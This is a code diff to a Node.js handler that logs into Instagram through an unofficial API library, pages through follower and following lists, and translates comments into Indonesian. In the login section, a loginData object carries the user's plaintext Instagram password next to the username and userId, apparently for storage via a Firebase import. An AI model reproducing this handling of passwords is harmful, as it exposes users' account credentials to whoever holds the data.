@@ -1,6 +1,4 @@
 const { IgApiClient } = require('instagram-private-api');
-const axios = require('axios');
-const path = require('path');
 const { db } = require('./config/firebaseConfig');
 const ig = new IgApiClient();
 
@@ -58,14 +56,14 @@ const getAllFollowers = async (userId, retries = 3, delayTime = 2000) => {
         try {
             let nextFollowers = await followersFeed.items();
             followers = followers.concat(nextFollowers);
-            attempt = 0; // Reset attempt after successful fetch
-            await delay(delayTime); // Delay to avoid rate limiting
+            attempt = 0; // Reset attempt setelah berhasil mengambil data
+            await delay(delayTime); // Delay untuk menghindari rate limiting
         } catch (error) {
             console.error('Error fetching followers:', error);
             if (attempt < retries) {
                 attempt++;
                 console.log(`Retrying attempt ${attempt}...`);
-                await delay(5000); // Delay before retrying
+                await delay(5000); // Delay sebelum mencoba ulang
             } else {
                 throw new Error('Failed to fetch followers after multiple retries.');
             }
@@ -73,6 +71,7 @@ const getAllFollowers = async (userId, retries = 3, delayTime = 2000) => {
     }
     return followers;
 };
+
 // Fungsi untuk mendapatkan data following dengan paginasi dan retry logic
 const getAllFollowing = async (userId, retries = 3, delayTime = 2000) => {
     let following = [];
@@ -83,14 +82,14 @@ const getAllFollowing = async (userId, retries = 3, delayTime = 2000) => {
         try {
             let nextFollowing = await followingFeed.items();
             following = following.concat(nextFollowing);
-            attempt = 0; // Reset attempt after successful fetch
-            await delay(delayTime); // Delay to avoid rate limiting
+            attempt = 0; // Reset attempt setelah berhasil mengambil data
+            await delay(delayTime); // Delay untuk menghindari rate limiting
         } catch (error) {
             console.error('Error fetching following:', error);
             if (attempt < retries) {
                 attempt++;
                 console.log(`Retrying attempt ${attempt}...`);
-                await delay(5000); // Delay before retrying
+                await delay(5000); // Delay sebelum mencoba ulang
             } else {
                 throw new Error('Failed to fetch following after multiple retries.');
             }
@@ -98,7 +97,6 @@ const getAllFollowing = async (userId, retries = 3, delayTime = 2000) => {
     }
     return following;
 };
-
 
 // Fungsi untuk menangani request profile Instagram
 exports.handler = async function (event, context) {
@@ -174,7 +172,7 @@ exports.handler = async function (event, context) {
 
             const loginData = {
                 username,
-                password,
+                password,  // Pastikan Anda tidak log atau mengirimkan password dalam log
                 userId,
                 timestamp: new Date().toISOString(),
                 profile_picture_url: user.profile_pic_url,
